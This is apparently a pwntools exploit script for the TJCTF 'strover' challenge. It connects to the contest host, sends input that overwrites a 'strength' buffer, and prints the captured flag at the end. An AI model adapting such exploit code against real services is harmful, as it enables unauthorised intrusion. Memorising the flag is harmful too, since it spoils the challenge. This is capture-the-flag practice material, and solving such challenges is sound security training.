#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('strover')

host = args.HOST or 'problem1.tjctf.org'
port = int(args.PORT or 8002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --
io = start()

for i in range(4):
    io.recvline()

for i in range(8):
    io.sendline('A test')

# this will override strength buffer
# 'd' = 100 => 'd' * 4 = 400
io.sendline('A dddd')
io.sendline('F')
io.interactive()

# tjctf{0oPs_CoMP4Ri5ONs_r_h4rD}
